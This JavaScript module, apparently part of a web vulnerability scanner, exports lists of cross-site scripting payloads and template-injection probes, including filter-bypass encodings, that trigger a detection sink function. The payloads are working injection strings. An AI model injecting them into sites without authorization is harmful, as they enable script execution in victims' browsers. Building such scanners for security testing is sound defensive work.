// Refereces:
// https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/XSS%20injection
// https://github.com/s0md3v/AwesomeXSS


//" => \x22 \42 %22
//' => \x27 \47 %27
//< => \x3c \74 %3c
//> => \x3e \76 %3e

exports.xss = [
	';window.___xssSink({0});',
	'javascript:window.___xssSink({0})',
	'java%0ascript:window.___xssSink({0})',
	'data:text/javascript;,window.___xssSink({0})',

	'<iMg src=a oNerrOr=window.___xssSink({0})>',
	'\\x3ciMg src=a oNerrOr=window.___xssSink({0})\\x3e',
	'\\74iMg src=a oNerrOr=window.___xssSink({0})\\76',

	"'><iMg src=a oNerrOr=window.___xssSink({0})>",
	"\\x27\\x3E\\x3Cimg src=a oNerrOr=window.___xssSink({0})\\x3E",
	"\\47\\76\\74img src=a oNerrOr=window.___xssSink({0})\\76",

	'"><iMg src=a oNerrOr=window.___xssSink({0})>',
	'\\x22\\x3e\\x3cimg src=a oNerrOr=window.___xssSink({0})\\x3e',
	'\\42\\76\\74img src=a oNerrOr=window.___xssSink({0})\\76',

	"'><iMg src=a oNerrOr=window.___xssSink({0})>",
	'\\x27\\x3e\\x3cimg src=a oNerrOr=window.___xssSink({0})\\x3e',
	'\\47\\76\\74img src=a oNerrOr=window.___xssSink({0})\\76',

	'1 --><iMg src=a oNerrOr=window.___xssSink({0})>',
	'1 --\\x3e\\x3ciMg src=a oNerrOr=window.___xssSink({0})\\x3e',
	'1 --\\76\\74iMg src=a oNerrOr=window.___xssSink({0})\\76',

	']]><iMg src=a oNerrOr=window.___xssSink({0})>',
	']]\\x3e\\x3ciMg src=a oNerrOr=window.___xssSink({0})\\x3e',
	']]\\76\\74iMg src=a oNerrOr=window.___xssSink({0})\\76',

	' oNpasTe=window.___xssSink({0}) ',

	'" oNpasTe=window.___xssSink({0}) a="',
	'\\x22 oNpasTe=window.___xssSink({0}) a=\\x22',
	'\\42 oNpasTe=window.___xssSink({0}) a=\\42',

	"' oNpasTe=window.___xssSink({0}) a='",
	"\\x27 oNpasTe=window.___xssSink({0}) a=\\x27",
	"\\47 oNpasTe=window.___xssSink({0}) a=\\47",

	// Bypass using javascript inside a string
	"</scrIpt><scrIpt>window.___xssSink({0})</scrIpt>",
	"\\x3c/scrIpt\\x3e\\x3cscript\\x3ewindow.___xssSink({0})\\x3c/scrIpt\\x3e",
	"\\74/scrIpt\\76\\74script\\76window.___xssSink({0})\\74/scrIpt\\76",

	"${window.___xssSink({0})}",

];

// template injection. it will be rendered as [object Object]123456[object Object]
exports.templateinj= [
	"{{this+{0}+this}}",
	"{this+{0}+this}",
	"this+{0}+this"
];
